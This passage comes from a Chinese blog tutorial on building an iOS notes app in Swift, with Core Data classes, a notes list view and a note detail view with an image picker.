class="line"></span><br><span class="line"><span class="comment">// 文本记事的笔记详情页</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoteViewController</span>: <span class="title">UIViewController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> note: <span class="type">Note!</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">var</span> textView: <span class="type">UITextView!</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">deleteNote</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="number">_</span> = <span class="type">NoteManager</span>.main.delete(note: note)</span><br><span class="line">        navigationController?.popViewController(animated: <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 载入已有的笔记数据</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        textView.text = note.contents</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 保存返回时的笔记数据</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillDisappear</span><span class="params">(<span class="number">_</span> animated: Bool)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewWillDisappear(<span class="literal">true</span>)</span><br><span class="line">        note.contents = textView.text</span><br><span class="line">        <span class="type">NoteManager</span>.main.save(note: note)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图文记事"><a href="#图文记事" class="headerlink" title="图文记事"></a>图文记事</h2><h3 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h3><h4 id="Note-CoreDataClass-swift"><a href="#Note-CoreDataClass-swift" class="headerlink" title="Note+CoreDataClass.swift"></a>Note+CoreDataClass.swift</h4><p>(文件可自动生成，不过是空文件，代码需要自己添加。生成操作见<strong>Swift使用CoreData储存数据</strong>)</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"><span class="keyword">import</span> CoreData</span><br><span class="line"></span><br><span class="line"><span class="meta">@objc</span>(<span class="type">Note</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImageNote</span>: <span class="title">NSManagedObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addDate: <span class="type">Date?</span> &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rawAddDate <span class="keyword">as</span> <span class="type">Date?</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span> &#123;</span><br><span class="line">            rawAddDate = newValue <span class="keyword">as</span> <span class="type">NSDate?</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> image: <span class="type">UIImage?</span> &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> imageData = rawImage <span class="keyword">as</span> <span class="type">Data?</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="type">UIImage</span>(data: imageData)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> image = newValue &#123;</span><br><span class="line">                rawImage = convertImageToNSData(image: image)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">convenience</span> <span class="keyword">init</span>?(title: <span class="type">String</span>, body: <span class="type">String?</span>, image: <span class="type">UIImage?</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> appDelegate = <span class="type">UIApplication</span>.shared.delegate <span class="keyword">as</span>? <span class="type">AppDelegate</span></span><br><span class="line">        <span class="comment">// import UIKit is needed to access UIApplication</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> managedContext = appDelegate?.persistentContainer.viewContext, !title.isEmpty <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">self</span>.<span class="keyword">init</span>(entity: <span class="type">ImageNote</span>.entity(), insertInto: managedContext)</span><br><span class="line">        <span class="keyword">self</span>.title = title</span><br><span class="line">        <span class="keyword">self</span>.body = body</span><br><span class="line">        <span class="keyword">self</span>.addDate = <span class="type">Date</span>(timeIntervalSinceNow: <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> image = image &#123;</span><br><span class="line">            <span class="keyword">self</span>.rawImage = convertImageToNSData(image: image)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">convertImageToNSData</span><span class="params">(image: UIImage)</span></span> -&gt; <span class="type">NSData?</span> &#123;</span><br><span class="line">        <span class="comment">// The image data can be represented as PNG or JPEG data formats.</span></span><br><span class="line">        <span class="comment">// Both ways to format the image data are listed below and the JPEG version is the one being used.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//return image.jpegData(compressionQuality: 1.0) as NSData?</span></span><br><span class="line">        <span class="keyword">return</span> processImage(image: image).pngData() <span class="keyword">as</span> <span class="type">NSData?</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// See: https://stackoverflow.com/questions/3554244/uiimagepngrepresentation-issues-images-rotated-by-90-degrees/33311936</span></span><br><span class="line">    <span class="comment">// This function processes the image so that it is oriented correctly when displayed.</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">processImage</span><span class="params">(image: UIImage)</span></span> -&gt; <span class="type">UIImage</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (image.imageOrientation == .up) &#123;</span><br><span class="line">            <span class="keyword">return</span> image</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">UIGraphicsBeginImageContext</span>(image.size)</span><br><span class="line">        </span><br><span class="line">        image.draw(<span class="keyword">in</span>: <span class="type">CGRect</span>(origin: <span class="type">CGPoint</span>.zero, size: image.size), blendMode: .copy, alpha: <span class="number">1.0</span>)</span><br><span class="line">        <span class="keyword">let</span> copy = <span class="type">UIGraphicsGetImageFromCurrentImageContext</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="type">UIGraphicsEndImageContext</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> unwrappedCopy = copy <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> image</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> unwrappedCopy</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Note-CoreDataProperties-swift"><a href="#Note-CoreDataProperties-swift" class="headerlink" title="Note+CoreDataProperties.swift"></a>Note+CoreDataProperties.swift</h4><p>(文件可自动生成，不过是空文件，代码需要自己添加。生成操作见<strong>Swift使用CoreData储存数据</strong>)</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"><span class="keyword">import</span> CoreData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">ImageNote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@nonobjc</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">func</span> <span class="title">fetchRequest</span>() -&gt; <span class="title">NSFetchRequest</span>&lt;<span class="title">ImageNote</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="type">NSFetchRequest</span>&lt;<span class="type">ImageNote</span>&gt;(entityName: <span class="string">"Note"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> title: <span class="type">String?</span></span><br><span class="line">    <span class="meta">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> body: <span class="type">String?</span></span><br><span class="line">    <span class="meta">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> rawAddDate: <span class="type">NSDate?</span></span><br><span class="line">    <span class="meta">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> rawImage: <span class="type">NSData?</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图文列表界面"><a href="#图文列表界面" class="headerlink" title="图文列表界面"></a>图文列表界面</h3><p>NotesViewController.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"><span class="keyword">import</span> CoreData</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotesViewController</span>: <span class="title">UIViewController</span>, <span class="title">UITableViewDataSource</span>, <span class="title">UITableViewDelegate</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> notes = [<span class="type">ImageNote</span>]()</span><br><span class="line">    <span class="keyword">var</span> dateFormatter = <span class="type">DateFormatter</span>()</span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> notesTableView: <span class="type">UITableView!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line"></span><br><span class="line">        dateFormatter.dateStyle = .medium</span><br><span class="line">        dateFormatter.timeStyle = .medium</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillAppear</span><span class="params">(<span class="number">_</span> animated: Bool)</span></span> &#123;</span><br><span class="line">        fetchNotes()</span><br><span class="line">        notesTableView.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">numberOfSections</span><span class="params">(<span class="keyword">in</span> tableView: UITableView)</span></span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, numberOfRowsInSection section: Int)</span></span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> notes.<span class="built_in">count</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, cellForRowAt indexPath: IndexPath)</span></span> -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cell = tableView.dequeueReusableCell(withIdentifier: <span class="string">"noteCell"</span>, <span class="keyword">for</span>: indexPath)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> note = notes[indexPath.row]</span><br><span class="line">        cell.textLabel?.text = note.title</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> addDate = note.addDate &#123;</span><br><span class="line">            cell.detailTextLabel?.text = dateFormatter.string(from: addDate)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> cell</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 左划选择删除笔记</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, editActionsForRowAt indexPath: IndexPath)</span></span> -&gt; [<span class="type">UITableViewRowAction</span>]? &#123;</span><br><span class="line">        <span class="keyword">let</span> deleteAction = <span class="type">UITableViewRowAction</span>(style: .destructive, title: <span class="string">"Delete"</span>) &#123; (rowAction, indexPath) <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">self</span>.deleteNote(indexPath: indexPath)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [deleteAction]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">prepare</span><span class="params">(<span class="keyword">for</span> segue: UIStoryboardSegue, sender: <span class="keyword">Any</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> segue.identifier == <span class="string">"Note"</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> destination = segue.destination <span class="keyword">as</span>? <span class="type">NoteDetailTableViewController</span> &#123;</span><br><span class="line">                destination.note = notes[notesTableView.indexPathForSelectedRow!.row]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取出存在本地的图文笔记数据</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">fetchNotes</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> appDelegate = <span class="type">UIApplication</span>.shared.delegate <span class="keyword">as</span>? <span class="type">AppDelegate</span> <span class="keyword">else</span> &#123;</span><br><span class="line">            notes = [<span class="type">ImageNote</span>]()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> managedContext = appDelegate.persistentContainer.viewContext</span><br><span class="line">        <span class="keyword">let</span> fetchRequest: <span class="type">NSFetchRequest</span>&lt;<span class="type">ImageNote</span>&gt; = <span class="type">ImageNote</span>.fetchRequest()</span><br><span class="line">        fetchRequest.sortDescriptors = [<span class="type">NSSortDescriptor</span>(key: <span class="string">"rawAddDate"</span>, ascending: <span class="literal">true</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            notes = <span class="keyword">try</span> managedContext.fetch(fetchRequest)</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">"Fetch for notes failed."</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">deleteNote</span><span class="params">(indexPath: IndexPath)</span></span> &#123;</span><br><span class="line">        <span class="keyword">let</span> note = notes[indexPath.row]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> managedObjectContext = note.managedObjectContext &#123;</span><br><span class="line">            managedObjectContext.delete(note)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> managedObjectContext.save()</span><br><span class="line">                <span class="keyword">self</span>.notes.remove(at: indexPath.row)</span><br><span class="line">                notesTableView.reloadData()</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                alertNotifyUser(message: <span class="string">"Delete failed."</span>)</span><br><span class="line">                notesTableView.reloadData()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">alertNotifyUser</span><span class="params">(message: String)</span></span> &#123;</span><br><span class="line">        <span class="keyword">let</span> alert = <span class="type">UIAlertController</span>(title: <span class="string">"Alert"</span>, message: message, preferredStyle: .alert)</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">"OK"</span>, style: .<span class="keyword">default</span>, handler: <span class="literal">nil</span>))</span><br><span class="line">        <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图文详情界面"><a href="#图文详情界面" class="headerlink" title="图文详情界面"></a>图文详情界面</h3><p>NoteDetailTableViewController.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoteDetailTableViewController</span>: <span class="title">UITableViewController</span>, <span class="title">UIImagePickerControllerDelegate</span>, <span class="title">UINavigationControllerDelegate</span> </span>&#123;</span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> titleTextField: <span class="type">UITextField!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> dateLabel: <span class="type">UILabel!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> bodyTextView: <span class="type">UITextView!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> imageView: <span class="type">UIImageView!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> dateFormatter = <span class="type">DateFormatter</span>()</span><br><span class="line">    <span class="keyword">let</span> newNoteDateFormatter = <span class="type">DateFormatter</span>()</span><br><span class="line">    <span class="keyword">let</span> imagePickerController = <span class="type">UIImagePickerController</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> note: <span class="type">ImageNote!</span></span><br><span class="line">    <span class="keyword">var</span> image: <span class="type">UIImage!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Stylize the body Text View.</span></span><br><span class="line">        bodyTextView.layer.borderWidth = <span class="number">1.0</span></span><br><span class="line">        bodyTextView.layer.borderColor = <span class="type">UIColor</span>(red: <span class="number">0.8</span>, green: <span class="number">0.8</span>, blue: <span class="number">0.8</span>, alpha: <span class="number">1.0</span>).cgColor</span><br><span class="line">        bodyTextView.layer.cornerRadius = <span class="number">6.0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Date Formatter for existing notes.</span></span><br><span class="line">        dateFormatter.dateStyle = .medium</span><br><span class="line">        dateFormatter.timeStyle = .medium</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Separate Date Formatter for new notes that only shows date (and no time).</span></span><br><span class="line">        <span class="comment">// The date and time are set when the note is saved in Core Data.</span></span><br><span class="line">        newNoteDateFormatter.dateStyle = .medium</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Initialize the form data.</span></span><br><span class="line">        <span class="comment">// If existing note, display its information.</span></span><br><span class="line">        <span class="comment">// If new note, show empty fields and a current Date (no time)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note = note &#123;</span><br><span class="line">            titleTextField.text = note.title</span><br><span class="line">            bodyTextView.text = note.body</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> addDate = note.addDate &#123;</span><br><span class="line">                dateLabel.text = dateFormatter.string(from: addDate)</span><br><span class="line">            &#125;</span><br><span class="line">            image = note.image</span><br><span class="line">            imageView.image = image</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            titleTextField.text = <span class="string">""</span></span><br><span class="line">            bodyTextView.text = <span class="string">""</span></span><br><span class="line">            dateLabel.text = newNoteDateFormatter.string(from: <span class="type">Date</span>(timeIntervalSinceNow: <span class="number">0</span>))</span><br><span class="line">            imageView.image = <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取图片</span></span><br><span class="line">    <span class="meta">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">selectImage</span><span class="params">(<span class="number">_</span> sender: <span class="keyword">Any</span>)</span></span> &#123;</span><br><span class="line">        selectImageSource()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 选择拍摄或者选择本地图片</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">selectImageSource</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">let</span> alert = <span class="type">UIAlertController</span>(title: <span class="string">"Select Image Source"</span>, message: <span class="literal">nil</span>, preferredStyle: .actionSheet)</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">"Camera"</span>, style: .<span class="keyword">default</span>, handler: &#123;</span><br><span class="line">            (alertAction) <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">self</span>.takePhotoUsingCamera()</span><br><span class="line">        &#125;))</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">"Photo Library"</span>, style: .<span class="keyword">default</span>, handler: &#123;</span><br><span class="line">            (alertAction) <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">self</span>.selectPhotoFromLibrary()</span><br><span class="line">        &#125;))</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">"Cancel"</span>, style: .cancel, handler: <span class="literal">nil</span>))</span><br><span class="line">        <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用相机</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">takePhotoUsingCamera</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="type">UIImagePickerController</span>.isSourceTypeAvailable(.camera)) &#123;</span><br><span class="line">            